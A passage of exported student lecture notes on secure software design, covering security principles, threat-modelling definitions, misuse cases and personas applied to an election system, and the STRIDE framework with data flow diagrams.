</p></details></li></ul><ul id="6077389a-788f-46a7-9ef0-3e80cec77fc4" class="toggle"><li><details><summary>Secure the Weakest Link Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="d7aaae41-3379-459b-b58a-076abd14fd62"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">attackers will target the weakest point in the application<ul id="336b7f3f-f5f5-4a21-a1f9-2f2edb86dcfd" class="bulleted-list"><li style="list-style-type:disc">no point of having a strong door when its next to a thin glass window</li></ul><ul id="116ca219-2ea9-476d-a571-ad9b0096ffcd" class="bulleted-list"><li style="list-style-type:disc">operating system can be the weakest link</li></ul><ul id="6392ca19-93b0-48b7-bd1f-e2952521f74a" class="bulleted-list"><li style="list-style-type:disc">threat models will lead you to the weakest link</li></ul></div></figure></details></li></ul><ul id="655e9804-044d-4f88-971f-b6144b81e718" class="toggle"><li><details><summary>Least privilege Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="0e10026e-3014-4f9d-bdbc-81c7def249f6"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">don’t give people more privilege than they need for an operation because they might abuse them</div></figure></details></li></ul><ul id="f6845039-e376-4901-894a-176839e7ec24" class="toggle"><li><details><summary>Fail securely Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="8f9e1fd9-7fd9-4f8b-8ecd-a45b4b0dc024"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">handle all failures securely and return the system to a proper state<ul id="3120d297-d6c4-439c-a63e-462ad36e3ee8" class="bulleted-list"><li style="list-style-type:disc">error messages can disclose information valuable to the attackers</li></ul><ul id="60ad6a22-3642-4617-87cf-6e615dd94ea6" class="bulleted-list"><li style="list-style-type:disc">make sure production code doesn’t have debug messages<p id="f48897aa-2e29-4ad4-8eac-dc845b3e9c2f" class="">an attacker can break a website and see what info and messages show up based on the attack</p></li></ul><figure id="300edd02-cd0e-469a-9a9b-f37d82885e11" class="image"><a href="Untitled%202.png"><img style="width:561.953125px" src="Untitled%202.png"/></a></figure></div></figure></details></li></ul><ul id="ac8dbf01-d032-4298-bc70-3848a10c7fed" class="toggle"><li><details><summary>Psychological acceptability Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="f013635c-d0f5-469e-a083-2b00768ba37e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">should not make the resource more difficult to access than if the security mechanism were not present<ul id="9f8c2d12-49db-4ab4-ab6e-6900b874c567" class="bulleted-list"><li style="list-style-type:disc">security and user friendliness are contradictory, security should work with the user</li></ul><ul id="28328f47-8ea4-4aa9-ac98-d54eaa0d9a9c" class="bulleted-list"><li style="list-style-type:disc">security should seek to be as unobtrusive as it can be</li></ul></div></figure><h3 id="b6f278bb-4a72-40cd-a97c-d1ae748f180b" class="">Example</h3><p id="8de4afb2-2522-48f1-8fab-c159f5843291" class="">passwords using passphrases are easier to remember than random numbers</p></details></li></ul><ul id="4302df35-16ee-42de-b4c8-fcdfb6928c36" class="toggle"><li><details><summary>Validate Inputs Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="d1412ca6-a69e-46d0-9ad3-28f9f59a0ca5"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">all inputs from the user should be treated as untrustworthy, so validate and monitor all inputs to catch malicious inputs</div></figure><p id="9a5589c7-4691-4b2d-807b-cf304a1f0402" class="">Anything coming from outside of your application<br/>may not agree with your expected input requirements<br/></p><p id="500716d5-8a80-4b6e-9318-c18a1885b97d" class="">Inputs that don&#x27;t meet<br/>expectations can lead to program<br/>states that are undefined<br/>o Undefined states are problematical<br/>for security because there is no sure<br/>way to predict how the application will respond<br/></p></details></li></ul><ul id="b5bf79af-7745-47a1-8f14-febc19dba030" class="toggle"><li><details><summary>Secure Data at Rest Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="399577fd-bc73-4806-bbb4-76cfbe19d8b9"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">data at rest must be protected to meet security requirements</div></figure><figure id="8987e07b-3669-439f-a055-67dbf6cb68c2" class="image"><a href="Untitled%203.png"><img style="width:623.984375px" src="Untitled%203.png"/></a></figure></details></li></ul><ul id="384a16d4-b96c-4d9c-b1b8-baadad8c30a9" class="toggle"><li><details><summary>Avoid Bypass Attacks Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="e6c97f3d-63a0-43dc-bddf-2178c07b9ce2"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">attacks that bypass authentication or authorization gates are among the most dangerous<ul id="cbba0997-4bcd-4a3c-a434-c1cfc47e5075" class="bulleted-list"><li style="list-style-type:disc">Bypass attacks are favourites among the evil-doers</li></ul></div></figure><figure id="43bad1bb-fad1-43ca-8fce-0437c3133be9" class="image"><a href="Untitled%204.png"><img style="width:652px" src="Untitled%204.png"/></a></figure><figure id="fc321ad8-5818-400f-86d6-cd0711270b19" class="image"><a href="Untitled%205.png"><img style="width:652px" src="Untitled%205.png"/></a></figure></details></li></ul></details></li></ul><ul id="ca6c87af-2e82-4cb7-a5e6-527a708cc873" class="toggle"><li><details><summary>Threat Modelling &amp; Brainstorming Concepts</summary><ul id="8f0cc8ee-84c9-4736-a027-b1a25b473aa7" class="toggle"><li><details><summary>Goal</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="d43b7f6f-a5a3-4681-8d39-557cd12cbe0e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">idea of threat modelling is that we want to try and prevent potential attacks from happening <ul id="0da73feb-6fd3-4d75-bc4e-289c02f65357" class="bulleted-list"><li style="list-style-type:disc">find the threat so we can stop them later</li></ul></div></figure></details></li></ul><ul id="cdcf2a0d-d17e-4a2e-84c8-6d2b130d7530" class="toggle"><li><details><summary>Definitions</summary><h3 id="a69edec6-63b9-4ff0-a390-ea3d8eaf8aeb" class="">Asset</h3><p id="dcec0a23-dd31-4c4d-a596-000d903a655f" class="">Something that should be protected</p><ul id="d3d433f3-0924-4ffe-bb08-703f3b5fda7f" class="bulleted-list"><li style="list-style-type:disc">computer files</li></ul><ul id="8e4bb14b-0608-44b2-8113-6e26148f1ce3" class="bulleted-list"><li style="list-style-type:disc">human life</li></ul><ul id="dd11b6fe-7088-4548-a7dc-4433ad6d7a14" class="bulleted-list"><li style="list-style-type:disc">access to a program</li></ul><h3 id="38260949-6fad-4f2d-8a2d-db839ae3f8e9" class="">Vulnerability</h3><p id="cd9732cc-af84-4ba9-a42b-7dda2c143a4d" class="">Weakness or lack of protections</p><ul id="03a1d96d-b538-4e68-bb38-7b4d855360b4" class="bulleted-list"><li style="list-style-type:disc">what is exploited by the attacker</li></ul><ul id="2fbca7ee-f51c-46f2-be50-08d2a046bd27" class="bulleted-list"><li style="list-style-type:disc">eg: not encrypting you files so someone can just download and read them</li></ul><ul id="f10a9b71-c1ee-46ee-95a2-a2071208eadc" class="bulleted-list"><li style="list-style-type:disc">caused by delibrite or accedentual or limitation of the program</li></ul><h3 id="2465dd0a-26ec-4bab-af10-618ddb9a207a" class="">Threat</h3><p id="aec0eb53-13c5-4e38-8373-6bff3c3eb238" class="">Something that could negatively impact an asset</p><ul id="86127b84-e592-4c39-9229-447d5f1a67dc" class="bulleted-list"><li style="list-style-type:disc">doesn’t have to be a person, could be random<ul id="e6c9f5b6-23e8-4580-a435-3a192e114f39" class="bulleted-list"><li style="list-style-type:circle">eg: cosmic radiation flipping a bit in a system in a satellite</li></ul></li></ul><h3 id="03978270-4355-449a-b7e6-60e894a46827" class="">Risk</h3><p id="2eb03780-6d46-401c-a05b-0602d6b24dd6" class="">the possibility that a threat will exploit a vulnerability to harm an asset</p><ul id="f789c84b-e466-4a47-b0fc-d9950e840183" class="bulleted-list"><li style="list-style-type:disc">lots of ways to calculate it</li></ul><ul id="7dab4703-c457-4c83-8200-2b50fb61f15e" class="bulleted-list"><li style="list-style-type:disc">eg: Risk = Threat * Vulnerability</li></ul><h3 id="925d3883-2e18-4578-abbe-8d6e3be3189b" class="">Security Controls aka “mitigations”</h3><p id="81fcf4ab-84e6-4a54-8391-bd9d92e0ba69" class="">Protect against threats, reduce vulnerability</p></details></li></ul><ul id="7c3c4112-709e-4363-a0da-0e9c34bb133d" class="toggle"><li><details><summary>Why?</summary><ul id="64d15c5b-dd8d-451c-8b5d-b6cb90478842" class="bulleted-list"><li style="list-style-type:disc">Non compliance</li></ul><ul id="217ea46f-3299-4e9a-b60d-359f29e8c94f" class="bulleted-list"><li style="list-style-type:disc">Data Loss</li></ul><ul id="2b2873f7-fbad-4eb0-9236-fd527e5adcf8" class="bulleted-list"><li style="list-style-type:disc">Monetary Cost</li></ul><ul id="285345db-bf4d-4a2c-971a-1e7b11a63e2f" class="bulleted-list"><li style="list-style-type:disc">Reputation</li></ul><ul id="18f0acaa-5bd6-4193-a3c1-0f14405bc44f" class="bulleted-list"><li style="list-style-type:disc">Weight/Cost of Risk Realisation</li></ul><ul id="2f3fc40d-20f4-4d9f-8aa9-357c9d99432a" class="bulleted-list"><li style="list-style-type:disc">Weight/Cost of Countermeasures</li></ul><p id="1c0f845b-69b5-4b73-8270-713caec855f2" class="">
</p></details></li></ul><ul id="8f20c666-828f-4b9e-8880-de6b98fc6645" class="toggle"><li><details><summary>When?</summary><p id="c69bf5f7-d4ef-499e-993d-f09945d3f838" class="">we can threat model either after implementation or during development</p><h3 id="5df05dac-2aaa-4165-b6e7-fe85e2a9b382" class="">After Implementation</h3><ul id="8b82da81-4d6c-4400-8653-d44f67b09817" class="bulleted-list"><li style="list-style-type:disc">High cost to fix issues</li></ul><ul id="f54fe580-b43b-4dfd-9996-d0a4f5e42bc3" class="bulleted-list"><li style="list-style-type:disc">More vulnerabilities = more risk</li></ul><p id="864bf326-8cf7-47de-adc0-b28c9ab724b7" class="">it becomes a lot harder to fix bugs after deloyment, so its cheaper to doing during development</p><figure id="812c6aed-7fab-4d5d-99ab-063e2a0ab75f" class="image"><a href="Untitled%206.png"><img style="width:623.96875px" src="Untitled%206.png"/></a></figure><h3 id="9baac7e7-7808-4fc0-944e-dae79d2bbc51" class="">During Development</h3><p id="40136671-9f18-472d-b378-58736af1fbc2" class="">Consider security during system design and development to reduce vulnerabilities</p><p id="384bcbb5-e248-493a-8cac-e1f4121b4d1a" class="">
</p><p id="da31619f-135c-4f6e-852f-2a6a47fd5984" class="">ideally, threat modeling is an iterative process that is done all the time</p><ul id="7cb20e84-91f5-4c45-9beb-e5ecb3d11bab" class="bulleted-list"><li style="list-style-type:disc">but we can’t do it all the time because conditions change</li></ul><ul id="e5a9b632-027e-4b8f-a68d-f20398de27a0" class="bulleted-list"><li style="list-style-type:disc">better things come out</li></ul><ul id="ea7d0dc8-e5fd-415a-8d7f-d689df6fc0eb" class="bulleted-list"><li style="list-style-type:disc">very old vulnerabilities come out</li></ul></details></li></ul><ul id="69145677-1c21-4d2b-9c7f-6eae41d60fa5" class="toggle"><li><details><summary>How to Threat Model</summary><h3 id="93a0393d-de62-463b-9d32-d263af862392" class="">Analysing the Application/System</h3><p id="dd56825f-c08d-4d6a-a17d-0609ca36e8cb" class="">What does the system do?</p><h3 id="895f1c16-7146-4174-a6ed-095184f1f3aa" class="">Determining Threats</h3><p id="ef24f168-aa3a-46e5-9cbd-41d3c8e238c1" class="">What could go wrong?</p><h3 id="ca58a747-6139-48fc-ad7e-5d44f00dfc3f" class="">Addressing Threats</h3><p id="2b4f7757-8eae-459c-ab4d-7477f777b2e6" class="">What can you do?</p></details></li></ul><ul id="d98d66be-bf4d-4d3f-8e96-daa134f4c79e" class="toggle"><li><details><summary>Threat Modelling techniques</summary><figure id="24e6cf23-cef1-40ed-875c-769b535645bc" class="image"><a href="Untitled%207.png"><img style="width:623.984375px" src="Untitled%207.png"/></a></figure></details></li></ul><ul id="a5d5aee1-4076-4fd4-a3c8-9b2a445812b8" class="toggle"><li><details><summary>Brainstorming</summary><p id="86086286-e39b-46c2-8ff7-39ed04d105ed" class="">get experts into a room and they talk about how to do the threat modeling</p><p id="af9b0ef8-bcfb-4af6-b13c-da276c54f4cb" class="">nothing about this is automated</p><p id="fc81c221-6ad0-473c-b24a-17c1075c266c" class="">idea is that we draw upon people’s experience </p><p id="3c081bda-d02b-449f-9793-95cbe1184b50" class="">experts can include security experts, security teams, developers</p><figure id="1884f924-f568-49e9-a99e-a0d13cc2f4aa" class="image"><a href="Untitled%208.png"><img style="width:623.96875px" src="Untitled%208.png"/></a></figure></details></li></ul><ul id="09fb9842-79bc-474b-bcae-5ded70eebd9e" class="toggle"><li><details><summary>Uses cases</summary><h3 id="e18b6ad7-c536-4d3a-a865-ec910762e16f" class="">Software Requirements</h3><p id="893e0135-4cb5-4b65-92c9-d149d7b7f393" class="">what the system should do, service or services that are provided, and constraints on operations</p><ul id="7d753201-388f-41ad-abe0-376576f6f77c" class="bulleted-list"><li style="list-style-type:disc">eg: for a payment system, once its taken your details, make a payment (functional requirements)</li></ul><h3 id="9a17cc32-1c11-4ef6-8f23-63d9d9f218fe" class="">Use case</h3><p id="af0711b1-8f65-484f-81ec-9964422049eb" class="">capture, model, and specify requirements</p><ul id="46a2154f-e736-4f08-831b-25a98a671abe" class="bulleted-list"><li style="list-style-type:disc">Behaviours system may perform</li></ul><ul id="59fc73d1-5db1-4f4e-a74d-4172acb5bde4" class="bulleted-list"><li style="list-style-type:disc">Interaction with actors</li></ul><ul id="8762fe4f-dcdf-444f-928e-42d428ed694f" class="bulleted-list"><li style="list-style-type:disc">Actors are human users or other systems.</li></ul><ul id="f4513e1b-561a-4fee-a33b-85b0f7427cfd" class="bulleted-list"><li style="list-style-type:disc">We’re using the simplest version that is similar to what is known as a user story.</li></ul><figure id="351cd41d-03e0-4c62-b497-220f925735d2" class="image"><a href="Untitled%209.png"><img style="width:623.984375px" src="Untitled%209.png"/></a></figure><p id="125fbaaa-d1ad-44ce-912f-6c3392cc4405" class="">
</p></details></li></ul><ul id="89fe101f-4ae6-47d7-9def-ac667b03ec1c" class="toggle"><li><details><summary>Misuse case</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="72791896-e1ff-4537-a9a9-f9d550afad75"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">opposite of a use cases, what we don’t want the threat model to do</div></figure><figure id="43c08c22-fb89-4c66-a6b5-7884829f8362" class="image"><a href="Untitled%2010.png"><img style="width:952px" src="Untitled%2010.png"/></a></figure></details></li></ul><ul id="8afc7b52-132e-4051-b14e-c64eb2f8f682" class="toggle"><li><details><summary>Personas</summary><figure id="b46cdafb-b3a8-491f-b237-5165d9fe54ea" class="image"><a href="Untitled%2011.png"><img style="width:965px" src="Untitled%2011.png"/></a></figure><h3 id="7b705019-ae43-4957-b8b3-18558e7fff0f" class="">Persona non Grata</h3><figure id="4ef1be2a-c37c-4943-9300-40cd136b6f90" class="image"><a href="Untitled%2012.png"><img style="width:952px" src="Untitled%2012.png"/></a></figure><figure id="1f9b285a-5ead-4ed1-acd5-c70c214186ca" class="image"><a href="Untitled%2013.png"><img style="width:918px" src="Untitled%2013.png"/></a></figure></details></li></ul><ul id="57d87c90-1a81-4476-bed6-9e138075eeac" class="toggle"><li><details><summary>Security card game</summary><p id="88efbd71-c0c8-4298-afc0-0a1d5ed3ea26" class="">card game called the security card game to break down threat modelling </p><ul id="5126da1a-09d6-4900-aa02-f84088035ba4" class="bulleted-list"><li style="list-style-type:disc"> what human assets could be impacted? </li></ul><ul id="647c50f9-9b9e-4b46-b20b-d10077770c2d" class="bulleted-list"><li style="list-style-type:disc">Who might attack your system and why? </li></ul><ul id="9cc4359e-1733-4974-94a6-55a369c23fae" class="bulleted-list"><li style="list-style-type:disc">What resources might the adversary have? </li></ul><ul id="eb0895ae-c546-40b4-82f1-3600610df7d7" class="bulleted-list"><li style="list-style-type:disc">How might the adversary attack your system? </li></ul><figure id="15924191-6e8d-4466-8e49-ba285c7f44a0" class="image"><a href="Untitled%2014.png"><img style="width:932px" src="Untitled%2014.png"/></a></figure><p id="6b9670eb-fb4a-484c-a764-3d760fccd721" class="">eg</p><figure id="d92108ef-81bf-435c-904e-0b41f315d93e" class="image"><a href="Untitled%2015.png"><img style="width:652px" src="Untitled%2015.png"/></a></figure><figure id="a17ff24f-c571-415d-89fe-b352e73c4893" class="image"><a href="Untitled%2016.png"><img style="width:569px" src="Untitled%2016.png"/></a></figure><figure id="53285ea6-1597-4257-a974-c2e187779715" class="image"><a href="Untitled%2017.png"><img style="width:652px" src="Untitled%2017.png"/></a></figure><p id="57104dd0-b292-4121-b1b2-f39cc9543572" class="">
</p></details></li></ul></details></li></ul><ul id="486a9d11-ab9a-4391-9d75-59ba6033a26f" class="toggle"><li><details><summary>Applying personas, misuse cases and security cards</summary><ul id="0b656853-9b73-454b-908c-1d69423c5794" class="toggle"><li><details><summary>Election use case</summary><p id="ceecab39-69bd-4b40-a974-4f022e444aa7" class="">Two use cases:</p><ul id="f458c2c7-6d6d-4f4e-841a-288137917ad3" class="bulleted-list"><li style="list-style-type:disc">registration as a voter</li></ul><ul id="9a6fca66-1ef0-4fb6-adc2-f24cc451b992" class="bulleted-list"><li style="list-style-type:disc">authenticating and casting a vote</li></ul><ul id="d963fb61-9fdc-4687-82fb-47aefc598ec4" class="bulleted-list"><li style="list-style-type:disc">verifying a vote</li></ul><h3 id="1ded9cfb-f08d-4865-9761-8bc24fa8d11c" class="">Use case – register voters</h3><ol type="1" id="673a7294-8711-4db8-8913-4f201c811685" class="numbered-list" start="1"><li>person visits voting site</li></ol><ol type="1" id="e3495b62-0c9a-4ed3-a45a-034dae27bae2" class="numbered-list" start="2"><li>person provides name and address</li></ol><ol type="1" id="83f78355-e61b-4ef1-934b-d09e1521d265" class="numbered-list" start="3"><li>system compares with details of file and if they match the person MUST NOW VERIFY THEMSELFS</li></ol><ol type="1" id="50a77681-975e-459e-8060-e73c21fa8780" class="numbered-list" start="4"><li>person can verify either by:<ol type="a" id="61972c5c-b860-4f17-a7da-a2754aec4ae0" class="numbered-list" start="1"><li>dirver licence</li></ol><ol type="a" id="a0032f47-f483-40b0-ac3a-f5cb94d7477f" class="numbered-list" start="2"><li>passport number </li></ol><ol type="a" id="4c1158ed-5b27-448c-92c9-3fce92b3f1b2" class="numbered-list" start="3"><li>real me</li></ol></li></ol><ol type="1" id="756005db-efe4-45e5-9e2b-52f8565a4d7d" class="numbered-list" start="5"><li>once verified, person <strong>registered </strong>as elector for election and access code sent via mobile number or email</li></ol><h3 id="2b8f9e8a-15c6-49ca-a66f-fefe00fed8be" class="">voting</h3><figure id="4f32267e-9145-416d-8c86-31b450bd78cf" class="image"><a href="Untitled%2018.png"><img style="width:893px" src="Untitled%2018.png"/></a></figure><h3 id="1a7436af-5011-46c7-a348-14a1193b1761" class="">verification</h3><figure id="d52d467e-b6f8-4a68-b915-01c911304ed6" class="image"><a href="Untitled%2019.png"><img style="width:652px" src="Untitled%2019.png"/></a></figure></details></li></ul><ul id="6ba12d5f-8b51-4e52-9b30-62b2e20358d7" class="toggle"><li><details><summary>Persona non grata</summary><p id="14d111ef-9550-4d79-8164-98f2e69f1c8d" class="">What are some persona non grata?</p><p id="dd8f4933-2cae-4c50-9928-e8c1e9225667" class=""><br/>ChatGPT prompt – “Consider a New Zealand local body election, give me a list of people who might gain from influencing the election in a negative way and their motivations”<br/></p><h3 id="a31684bc-02f5-445b-a834-ab9bea1efda3" class="">Flesh them out</h3><figure id="0665bbd1-5170-48a6-9ae2-7111bf834853" class="image"><a href="Untitled%2020.png"><img style="width:1444px" src="Untitled%2020.png"/></a></figure></details></li></ul><ul id="9ed144cd-2616-4bb6-8182-203e864855f4" class="toggle"><li><details><summary>Election misuse cases</summary><h3 id="52263e6a-af83-42ad-ba33-e8dc4632c4f7" class="">register fake voters</h3><figure id="94da8f1f-ce24-49a1-b37c-06f1b96d88c9" class="image"><a href="Untitled%2021.png"><img style="width:652px" src="Untitled%2021.png"/></a></figure><p id="237b03b6-442a-43d2-b101-3787978f1f43" class="">how can you prevent this?</p><ul id="c794ea3d-ecc4-4cca-b259-695b7f9eb88d" class="bulleted-list"><li style="list-style-type:disc">look for anomalies in the patterns for how many voters are expected</li></ul><ul id="8b6d34c3-780f-4b8d-8235-46a6ef09a04f" class="bulleted-list"><li style="list-style-type:disc">check geological locations for IP addresses</li></ul><h3 id="4eb8b64c-f7a1-4321-be88-341a61c4d10b" class="">Election misuse cases</h3><figure id="7e954974-ba53-4399-80fd-f77cbf98175f" class="image"><a href="Untitled%2022.png"><img style="width:766px" src="Untitled%2022.png"/></a></figure></details></li></ul><ul id="1568a572-71ca-4fdc-a3a8-779fbcfbda0d" class="toggle"><li><details><summary>Security cards - process</summary><figure id="a8b6a77d-08d8-4ab3-9fef-a42ed6a02a92" class="image"><a href="Untitled%2023.png"><img style="width:652px" src="Untitled%2023.png"/></a></figure></details></li></ul><ul id="2855933b-b57e-4844-8d61-b71c3aae0d46" class="toggle"><li><details><summary>Story</summary><figure id="98ae48ab-fcb0-4ac8-bbdc-eb0d6c210a24" class="image"><a href="Untitled%2024.png"><img style="width:623.96875px" src="Untitled%2024.png"/></a></figure></details></li></ul></details></li></ul><ul id="2fb56509-461f-4791-9d8e-335ddecdbe82" class="toggle"><li><details><summary>Threat Modelling Guest Lecture</summary><ul id="ca9824f7-6051-4e3c-821f-7ffeb400e47a" class="toggle"><li><details><summary>Every piece of software we build has risk</summary><h3 id="b607cdfa-9d07-4f54-95ca-0e4a64d20f95" class="">1 of the hardest problems in software: naming things</h3><ul id="0bbc2c50-43c0-40f6-9c58-718e698ae71d" class="bulleted-list"><li style="list-style-type:disc">Threat modeling</li></ul><ul id="26d760c9-ddea-4bc5-92c8-6493d80970f0" class="bulleted-list"><li style="list-style-type:disc">Threat assessment</li></ul><ul id="bca3edf5-ccf3-4b27-bd9c-4d1eea4a4910" class="bulleted-list"><li style="list-style-type:disc">Security design reviews</li></ul><ul id="cfcd7558-d791-4083-ae04-26852cc0a7b1" class="bulleted-list"><li style="list-style-type:disc">Security modeling</li></ul><ul id="26e249d7-1eb7-49e5-b4f0-d6aa62bb7972" class="bulleted-list"><li style="list-style-type:disc">… Examining a design or architecture from a high-level to identify security<br/>risks and plan suitable mitigations<br/></li></ul><h3 id="6cd76a69-158c-4e5c-9231-9da59e59d4a0" class="">How to assess or model a system</h3><figure id="c9ceac14-d9b9-4cf2-bc6f-cbfbfaab53cb" class="image"><a href="Untitled%2025.png"><img style="width:623.96875px" src="Untitled%2025.png"/></a></figure><ul id="53eb7b17-a352-4b7b-ab1d-ff857854b78d" class="bulleted-list"><li style="list-style-type:disc">understand the system, are we collecting just username passwords or passports and birth certificates. also do we need them?</li></ul><ul id="4be82ee4-d7f3-49da-8db7-2e054efd7347" class="bulleted-list"><li style="list-style-type:disc">if you didn’t build it, then its just a conversation </li></ul><ul id="de74dd94-25fc-415d-a205-2ab44a2233c0" class="bulleted-list"><li style="list-style-type:disc">thread modeling can identify information you don’t need to collect and change our system</li></ul><h3 id="cfd5de53-4716-4701-b151-58541caaa890" class="">Threat modeling on paper</h3><figure id="508ebe60-4e87-44d1-b8ff-402f0232d9f8" class="image"><a href="Untitled%2026.png"><img style="width:652px" src="Untitled%2026.png"/></a></figure><ul id="98db6841-8041-4177-800f-b865029bfa9b" class="bulleted-list"><li style="list-style-type:disc">thread modeling is a process that is repeatable</li></ul><ul id="70a952d7-b399-48af-b4b0-7ec264a74bbb" class="bulleted-list"><li style="list-style-type:disc">you don’t just do it once, you have to keep doing it</li></ul><ul id="1d58e0e6-f39c-4261-8f8f-518c0bff872f" class="bulleted-list"><li style="list-style-type:disc">there is a demand in security, not enough security people compared to developer </li></ul><ul id="b0bd4d43-1c6a-4778-a502-18e3e2e05eb1" class="bulleted-list"><li style="list-style-type:disc">its a special skill<ul id="2efcbc52-1e74-49e8-ad86-bd2a131cfce7" class="bulleted-list"><li style="list-style-type:circle">can be applied to any situation</li></ul></li></ul><ul id="f2d74c01-01e4-4fcd-9747-be940e513e4f" class="bulleted-list"><li style="list-style-type:disc">its a collaborative exercise </li></ul><h3 id="69162027-0e16-4101-bdc7-5af63790c89e" class="">Threat modeling in practice</h3><figure id="7a580a69-1f5a-4111-bdf9-e1cf25613a37" class="image"><a href="Untitled%2027.png"><img style="width:623.9375px" src="Untitled%2027.png"/></a></figure><ul id="355c1f7e-52e3-40ca-986d-0e4bdb2bb7ea" class="bulleted-list"><li style="list-style-type:disc">very flexible discipline that an organization can adapt in various different ways</li></ul><p id="75be9b62-1bb8-4b40-91b9-cdb3c4a6aa09" class="">
</p></details></li></ul><ul id="17942445-3dd7-4601-b4e0-cd486a608c6c" class="toggle"><li><details><summary>Security is a key pillar to good engineering. Threat modeling is a key skill for security.</summary><h3 id="ab09ffc1-2949-43eb-9fad-3f111ce81597" class="">Tips before we jump in</h3><figure id="84a1df84-7136-4866-b08c-de42aa1ff5e9" class="image"><a href="Untitled%2028.png"><img style="width:392px" src="Untitled%2028.png"/></a></figure><h3 id="e1c2d88a-eaf9-40ee-8cee-4cb46369b7cc" class="">Let’s get into it</h3><figure id="ef7235f6-5255-49a5-a2aa-defd4568cdcc" class="image"><a href="Untitled%2029.png"><img style="width:505px" src="Untitled%2029.png"/></a></figure><h3 id="ccb559a8-fea3-41a2-bb82-e829d125405f" class="">1. Pick your framework</h3><p id="2f307de9-08d7-4811-ab1e-bff0a1348aaf" class="">we’re using stride</p><figure id="fb1769aa-1aa2-45c1-afa1-623b6b867a84" class="image"><a href="Untitled%2030.png"><img style="width:623.96875px" src="Untitled%2030.png"/></a></figure><h3 id="11626156-3d8f-41ae-812c-92f3957522e3" class="">2. Establish context</h3><figure id="cb071c44-1855-4583-89b4-52b748fccef5" class="image"><a href="Untitled%2031.png"><img style="width:623.96875px" src="Untitled%2031.png"/></a></figure><h3 id="f4836982-b227-4926-85ab-540965a5f52c" class="">3. Draw your design</h3><figure id="e1e9c102-d970-41c6-beb7-353ceee8c0b1" class="image"><a href="Untitled%2032.png"><img style="width:623.96875px" src="Untitled%2032.png"/></a></figure><figure id="8043b08a-881c-40ec-bad7-0bd29b0c957e" class="image"><a href="Untitled%2033.png"><img style="width:652px" src="Untitled%2033.png"/></a></figure><h3 id="18c25a33-daa8-4b99-a8e6-b94581583fad" class="">4. Apply the framework</h3><figure id="8b139080-b83f-4cad-b20e-508fe9ccfb86" class="image"><a href="Untitled%2034.png"><img style="width:623.96875px" src="Untitled%2034.png"/></a></figure><figure id="31de8e32-fce0-40e3-a543-e49eca0737c7" class="image"><a href="Untitled%2035.png"><img style="width:652px" src="Untitled%2035.png"/></a></figure><h3 id="a668fdee-5cae-453c-a684-77614fb75976" class="">5. Discuss, document the threats, risks, and mitigating controls</h3><figure id="23afc603-b838-4666-92e8-997160c291a1" class="image"><a href="Untitled%2036.png"><img style="width:623.984375px" src="Untitled%2036.png"/></a></figure><h3 id="2ec2118b-c913-4098-85aa-8a8651049fe6" class="">What defenses were used to protect a castle?</h3><figure id="c2197ee2-a4ed-47b3-9cc0-544c2a54362c" class="image"><a href="Untitled%2037.png"><img style="width:623.984375px" src="Untitled%2037.png"/></a></figure><figure id="3534dbc3-c10e-4f5d-9e5d-409fb4a3bb32" class="image"><a href="Untitled%2038.png"><img style="width:623.96875px" src="Untitled%2038.png"/></a></figure><h3 id="eeb75009-a4d5-4997-85b9-d8ead5859f93" class="">5. Discuss, document the threats, risks, and mitigating controls</h3><figure id="436bdee4-3c34-4955-b448-499d4f06af53" class="image"><a href="Untitled%2039.png"><img style="width:623.984375px" src="Untitled%2039.png"/></a></figure><h3 id="672f2f10-1161-48dd-b834-04f6b40011ff" class="">6. Revise, repeat</h3><figure id="758c3667-8337-42c5-bd86-ad75abd89703" class="image"><a href="Untitled%2040.png"><img style="width:623.984375px" src="Untitled%2040.png"/></a></figure></details></li></ul></details></li></ul><ul id="dcc60f4f-15b2-491a-b385-ec01fdf6056c" class="toggle"><li><details><summary>STRIDE</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="25f948fc-8005-4c0c-b693-24576e8c24f7"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">stands for Spoofing, Tampering, Repudiation, Information disclosure ,DDOS and Elevation of privilege.<br/>these are factors we want to consider threat modeling<br/><figure id="1f93a463-cfda-4d89-8a81-c1c14cb5d740" class="image"><a href="Untitled%2041.png"><img style="width:618px" src="Untitled%2041.png"/></a></figure></div></figure><ul id="59f62cf8-9194-4ea2-bfef-9deda14ea136" class="toggle"><li><details><summary>Data Flow Diagrams (DFD)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="7f624b0e-a5b3-4f40-97c5-5fafd2b31212"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">a map of how data flows through a system and where it processed, stored and shared between different systems.<ul id="bc3422f1-9406-4b37-ae45-43fa49104d40" class="bulleted-list"><li style="list-style-type:disc">strides are all about DFD’s</li></ul><figure id="df8f9a82-bc10-4472-a03d-69686ba6af69" class="image"><a href="Untitled%2042.png"><img style="width:590px" src="Untitled%2042.png"/></a></figure></div></figure><ul id="82922331-fa57-4c63-b1cb-e9b29caf37a9" class="toggle"><li><details><summary>Rules for DFDs</summary><h3 id="53d0310b-70bd-4e5f-a6e9-5e5c9a50f6e8" class="">1) Data cannot flow between two interactors</h3><p id="c3212ca9-8af8-4ac9-b1c7-3e98ce4f2865" class="">Data flow must be from <mark class="highlight-yellow_background">interactor to a process</mark> or a <mark class="highlight-yellow_background">process to an entity</mark>. There can be multiple data flows between one interactor and a process</p><figure id="f031c07f-a8b4-471d-8dd3-7cf459ccfabc" class="image"><a 